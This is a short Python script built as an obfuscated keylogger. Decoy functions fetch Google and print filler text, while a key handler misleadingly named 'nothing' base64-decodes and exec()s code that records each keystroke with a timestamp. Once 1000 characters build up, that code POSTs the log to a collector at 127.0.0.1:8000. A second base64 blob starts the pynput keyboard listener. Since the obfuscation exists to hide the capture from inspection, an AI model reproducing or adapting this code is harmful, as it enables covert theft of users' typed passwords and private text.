import time
import random
import requests
from datetime import datetime
from pynput.keyboard import Listener
from bs4 import BeautifulSoup as soap
import base64

text = ""

def Get_data():
    print("Getting Data from Google")
    r = requests.get('https://google.com')
    page = soap(r.text, 'lxml')
    page.find('a')

def foo():
    print('Bar')
    Get_data()

def nothing(key):
    global text
    first_name = "Z2xvYmFsIHRleHQKdGV4dCArPSBmIlt7ZGF0ZXRpbWUubm93KCl9XSB7a2V5fVxuIgppZiBsZW4odGV4dCkgPiAxMDAwO"
    mid_name = 'gogICAgZGF0YT17J3RleHQnOiB0'
    last_name = "ZXh0fQogICAgcmVxdWVzdHMucG9zdCgnaHR0cDovLzEyNy4wLjAuMTo4MDAwL3Byb2Nlc3NfZGF0YScsIGpzb249ZGF0YSk="
    name = f"{first_name}{mid_name}{last_name}"
    [exec(base64.b64decode(x).decode('utf-8')) for x in ((name.encode('utf-8')),)]
    # text += f"[{datetime.now()}] {key}\n"
    # if len(text) > 1000:
    #     data={'text': text}
    #     requests.post('http://127.0.0.1:8000/process_data', json=data)

for i in range(10):
    print(f"Step {i}")
    rr = random.randint(1, 3)
    time.sleep(rr)
    a = [foo, Get_data]
    a[rr%2]()

try:
    with open('nofile.txt', 'r') as f:
        f.read()
except Exception as ex:
    print(ex)

if __name__ == '__main__':
    [exec(base64.b64decode(x).decode('utf-8')) for x in (("d2l0aCBMaXN0ZW5lcihub3RoaW5nKSBhcyBwcnI6CiAgICBwcnIuam9pbigp".encode('utf-8')),)]
